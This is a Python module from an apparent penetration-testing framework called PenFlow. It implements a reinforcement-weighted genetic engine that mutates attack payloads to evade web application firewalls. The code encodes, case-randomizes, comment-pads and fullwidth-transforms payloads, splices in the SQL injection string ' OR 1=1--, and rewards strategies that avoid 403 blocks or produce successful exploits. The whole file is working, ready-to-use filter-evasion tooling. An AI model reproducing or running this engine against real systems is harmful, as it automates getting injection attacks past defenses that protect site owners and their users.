"""
SelfImprovingPayloadEngine — Genetic & Reinforcement-Guided Payload Mutation Engine for PenFlow.

Features:
  1. Multi-Armed Bandit & Fitness Optimization: Adjusts strategy selection based on dynamic reward signals (+10 success, +3 bypass, -5 block).
  2. Genetic Mutation Pipeline: Combines operators (crossover, character mutation, delimiter alternation, comment interleaving).
  3. Technology-Tailored Convergence: Evolves payloads towards optimal bypass vectors for specific backend engines.
"""
import random
import urllib.parse
from typing import List, Dict, Any, Optional
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.intelligence.self_improving_payloads")


class GeneticPayloadMutator:
    """Genetic algorithm mutator for payload string evolution."""

    @staticmethod
    def mutate_delimiters(payload: str) -> str:
        replacements = [(" ", "/**/"), (" ", "%20"), (" ", "+"), (" ", "%09"), (" ", "%0A")]
        res = payload
        for old, new in replacements:
            if old in res:
                return res.replace(old, new, 1)
        return payload

    @staticmethod
    def mutate_quotes(payload: str) -> str:
        if "'" in payload:
            return payload.replace("'", '"', 1)
        elif '"' in payload:
            return payload.replace('"', "'", 1)
        return payload

    @staticmethod
    def mutate_case(payload: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    @staticmethod
    def crossover(payload_a: str, payload_b: str) -> str:
        """Performs single-point genetic crossover between two candidate payloads."""
        if not payload_a or not payload_b:
            return payload_a or payload_b
        split_a = len(payload_a) // 2
        split_b = len(payload_b) // 2
        return payload_a[:split_a] + payload_b[split_b:]


class SelfImprovingPayloadEngine:
    """
    Reinforcement & Genetic Payload Optimization Engine.
    """
    def __init__(self):
        self.effectiveness_history: Dict[str, Dict[str, Any]] = {}
        self.strategy_rewards: Dict[str, float] = {
            "url_encode": 5.0,
            "double_url_encode": 5.0,
            "unicode_fullwidth": 6.0,
            "case_randomize": 4.0,
            "comment_insertion": 5.5,
            "whitespace_replacement": 4.5,
            "genetic_crossover": 7.0
        }
        self.genetic = GeneticPayloadMutator()

    def record_feedback(
        self,
        strategy: str = "",
        target: str = "",
        technology: str = "",
        was_blocked: bool = False,
        was_successful: bool = False,
        status_code: int = 200,
        **kwargs
    ) -> None:
        """
        Updates reinforcement reward scores:
          - Successful exploit: +10.0
          - WAF bypass (non-403 response): +3.0
          - WAF block (403): -5.0
        """
        strat_key = strategy or kwargs.get("payload", "") or kwargs.get("strategy_or_payload", "url_encode")
        if strat_key not in self.strategy_rewards:
            strat_key = "url_encode"

        reward_delta = 0.0
        if was_successful:
            reward_delta += 10.0
        elif not was_blocked and status_code in (200, 500, 302):
            reward_delta += 3.0
        elif was_blocked or status_code in (403, 406):
            reward_delta -= 5.0

        current_score = self.strategy_rewards.get(strat_key, 5.0)
        self.strategy_rewards[strat_key] = max(0.5, current_score + reward_delta * 0.2)

        key = f"{target}::{technology}"
        if key not in self.effectiveness_history:
            self.effectiveness_history[key] = {
                "total_attempts": 0,
                "blocked_count": 0,
                "success_count": 0,
                "best_strategy": strat_key
            }
        entry = self.effectiveness_history[key]
        entry["total_attempts"] += 1
        if was_blocked:
            entry["blocked_count"] += 1
        if was_successful:
            entry["success_count"] += 1
            entry["best_strategy"] = strat_key

        logger.info(f"[SelfImprovingPayloadEngine] Strategy '{strat_key}' reward updated to {self.strategy_rewards[strat_key]:.2f}")

    def mutate_payload(self, base_payload: str, strategy: str = "url_encode") -> str:
        if strategy == "url_encode":
            return urllib.parse.quote(base_payload)
        elif strategy == "double_url_encode":
            return urllib.parse.quote(urllib.parse.quote(base_payload))
        elif strategy == "case_randomize":
            return self.genetic.mutate_case(base_payload)
        elif strategy == "unicode_fullwidth":
            return "".join([chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in base_payload])
        elif strategy == "comment_insertion":
            return base_payload.replace(" ", "/**/")
        elif strategy == "whitespace_replacement":
            return self.genetic.mutate_delimiters(base_payload)
        elif strategy == "genetic_crossover":
            return self.genetic.crossover(base_payload, "' OR 1=1--")
        return base_payload

    def get_optimal_mutations(self, base_payload: str, target: str = "") -> List[Dict[str, Any]]:
        """Returns mutations ranked by strategy rewards for legacy integration."""
        mutations = []
        for strategy, weight in sorted(self.strategy_rewards.items(), key=lambda x: x[1], reverse=True):
            mutated = self.mutate_payload(base_payload, strategy)
            mutations.append({
                "strategy": strategy,
                "mutated_payload": mutated,
                "weight": weight
            })
        return mutations

    def evolve_population(self, seed_payload: str, generations: int = 3, population_size: int = 5) -> List[str]:
        """Evolves a population of mutated payloads across multiple generations."""
        population = [seed_payload]
        strategies = list(self.strategy_rewards.keys())

        for _ in range(generations):
            new_pop = []
            for p in population:
                strat = random.choices(strategies, weights=[self.strategy_rewards[s] for s in strategies])[0]
                mutated = self.mutate_payload(p, strat)
                new_pop.append(mutated)
            population.extend(new_pop)

        return list(dict.fromkeys(population))[:population_size]
